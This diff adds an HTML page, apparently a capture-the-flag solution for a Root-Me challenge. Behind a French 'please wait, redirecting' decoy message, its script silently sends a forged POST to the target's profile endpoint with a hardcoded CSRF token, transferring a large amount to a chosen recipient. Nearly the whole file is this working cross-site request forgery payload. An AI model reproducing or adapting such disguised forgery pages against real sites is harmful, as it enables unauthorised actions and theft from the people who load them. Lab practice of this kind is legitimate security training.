@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Exploit</title>
+</head>
+<body>
+    <h1>Veuillez patienter...</h1>
+    <p>Votre redirection est en cours.</p>
+    <script>
+        const csrfToken = "Q1NSRnNfNHIzX2MwMGw6bHVuYToxMDA%3D"; // Token CSRF
+        const recipient = "paflepafausaure"; // Destinataire
+        const amount = "10000000"; // Montant
+
+        // Création de la requête POST
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://instance-019a9ce2-8ab8-71bb-9f0b-c5caa11f1d6a.challenges.root-me.pro/profile/", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+        // Données à envoyer dans le corps de la requête
+        const data = token=${encodeURIComponent(csrfToken)}&recipient=${encodeURIComponent(recipient)}&amount=${encodeURIComponent(amount)};
+
+        // Envoi de la requête
+        xhr.send(data);
+
+        // Message de succès ou d'erreur
+        xhr.onload = () => {
+            if (xhr.status === 200) {
+                console.log("Requête réussie !");
+            } else {
+                console.error("Erreur :", xhr.statusText);
+            }
+        };
+    </script>
+</body>
